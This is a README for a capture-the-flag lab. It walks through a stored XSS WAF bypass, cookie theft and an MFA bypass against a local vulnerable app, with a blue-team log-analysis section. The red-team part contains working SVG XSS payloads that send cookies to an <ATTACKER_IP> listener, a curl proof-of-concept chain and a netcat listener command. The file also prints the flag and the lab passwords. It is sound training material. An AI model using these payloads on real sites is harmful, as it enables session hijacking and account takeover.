# CTF Lab — Scenario 75: Cookies Reuse & MFA Bypass

A self-contained Red vs. Blue cyber range lab simulating a session cookie theft attack via XSS and MFA bypass.

## Requirements

- Docker & Docker Compose
- Linux VM (tested on Ubuntu 22.04 / Kali Linux)

## Deployment

```bash
# 1. Clone the repository
git clone https://github.com/primesatya/ctf-lab-scenario75
cd ctf-lab-scenario75

# 2. Run setup (creates log directory and injects simulated attack logs)
bash scripts/setup.sh

# 3. Start the lab
docker compose up --build -d
```

## Access Points

| Service | Address | Credentials |
|---|---|---|
| Web App | http://localhost:3075 | admin / letmein |
| MFA Code | — | `314159` |
| SSH (Blue Team) | `ssh analyst@localhost -p 2275` | analyst / blue_team_rocks |
| Logs | /opt/admin/logs/ | — |

---

## Red Team Walkthrough

### Phase 1 — Reconnaissance

1. Visit `http://localhost:3075` — check response headers for `X-Powered-By: Node.js`
2. View page source — HTML comment contains ASCII art hinting to check `/robots.txt`
3. Visit `/robots.txt` — reveals disallowed paths:
   - `/api/verify-mfa` ← MFA endpoint
   - `/dashboard` ← admin area
4. Attempt to access `/dashboard` directly — redirected back to `/` (session required)

### Phase 2 — WAF Bypass & Stored XSS

1. POST to `/api/feedback` with `<script>alert(1)</script>` — returns **403** (WAF blocks `<script>` tags)

2. Bypass using an SVG payload (WAF only checks for `<script>`, event handlers pass through):
   ```
   POST /api/feedback
   Content-Type: application/json

   {"feedback": "<svg onload=\"alert(1)\">"}
   ```

3. To exfiltrate the session cookie, use bracket notation to avoid WAF keyword matching and DNS/HTTP exfiltration:
   ```
   {"feedback": "<svg onload=\"fetch('http://<ATTACKER_IP>/?d='+document['cookie'])\">"}
   ```

4. Log in as admin (`admin` / `letmein`) and navigate to `/dashboard` — the stored XSS fires, exfiltrating the `pre_mfa_session` cookie to your listener.

   > **Why HttpOnly=false?** The `pre_mfa_session` cookie is intentionally accessible to JavaScript — this is the design flaw. It is issued immediately after login, before MFA is completed.

### Phase 3 — Cookie Reuse & MFA Bypass

The attack exploits two chained vulnerabilities:

1. **`pre_mfa_session` issued before MFA** — the cookie exists the moment credentials are verified, giving an attacker a window to steal it via XSS before the admin completes MFA.

2. **Dashboard accepts pre-auth cookie** — `/dashboard` checks for `adm_sess` (the post-MFA cookie) but falls back to accepting `pre_mfa_session`. MFA verification is never enforced.

**Steps:**

```bash
# 1. Replay the stolen pre_mfa_session cookie directly to /dashboard
curl -s http://localhost:3075/dashboard \
  -H "Cookie: pre_mfa_session=<STOLEN_TOKEN>"
```

The dashboard loads with:
```
MFA Status: NOT VERIFIED — session hijacked?
```

MFA was bypassed. The attacker has admin access without ever entering the MFA code.

**Proof of concept — full chain:**
```bash
# Step 1: inject XSS payload (start listener first: nc -lvnp 8888)
curl -s -X POST http://localhost:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback":"<svg onload=\"fetch('"'"'http://<ATTACKER_IP>:8888/?d='"'"'+document['"'"'cookie'"'"'])\">"}' 

# Step 2: admin logs in and visits /dashboard → your listener receives the cookie

# Step 3: replay stolen cookie
curl -s http://localhost:3075/dashboard \
  -H "Cookie: pre_mfa_session=<STOLEN_TOKEN>"
```

---

## Blue Team Walkthrough

### Objective

Analyze server logs via SSH to reconstruct the attack timeline and retrieve the hidden flag.

### Step 1 — SSH into the log server

```bash
ssh analyst@localhost -p 2275
# password: blue_team_rocks
```

### Step 2 — Review access.log

```bash
cat /opt/admin/logs/access.log
```

Identify suspicious activity from `10.10.14.50`:

| Timestamp | Event |
|---|---|
| 18:49:22 | GET /robots.txt — attacker enumerating disallowed paths |
| 18:50:15 | POST /api/feedback → **403** — blocked `<script>` tag |
| 18:51:10 | POST /api/feedback → **200** — WAF bypass succeeded (SVG payload) |
| 18:51:55 | GET /dashboard → **200** — unauthorized access with stolen cookie |
| 18:52:10 | GET /collect?data=stolen — cookie exfiltration request |

### Step 3 — Review error.log

```bash
cat /opt/admin/logs/error.log
```

Critical entries:
```
[CRITICAL] COOKIE_REUSE: Pre-auth session token replayed as admin session from 10.10.14.50
[CRITICAL] Authentication bypass anomaly detected from 10.10.14.50 — session escalated without MFA completion
```

### Step 4 — Extract the flag

The exfiltration request at `18:52:10` contains a Base64-encoded value in the `Referer` field:

```bash
grep "collect" /opt/admin/logs/access.log | grep -oP '[A-Za-z0-9+/=]{20,}'
```

Decode it:
```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=" | base64 -d
```

---

## Flag

```
PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}
```

---

## Vulnerability Summary

| ID | Vulnerability | Location |
|---|---|---|
| V-01 | `pre_mfa_session` cookie issued before MFA (HttpOnly=false) | `app.js` — `/api/login` |
| V-02 | WAF only blocks `<script>` tags — SVG/event-handler vectors bypass it | `app.js` — `wafMiddleware` |
| V-03 | Stored XSS — feedback reflected on dashboard without sanitization | `app.js` — `/dashboard` |
| V-04 | Dashboard accepts pre-auth cookie — MFA never enforced | `app.js` — `/dashboard` |
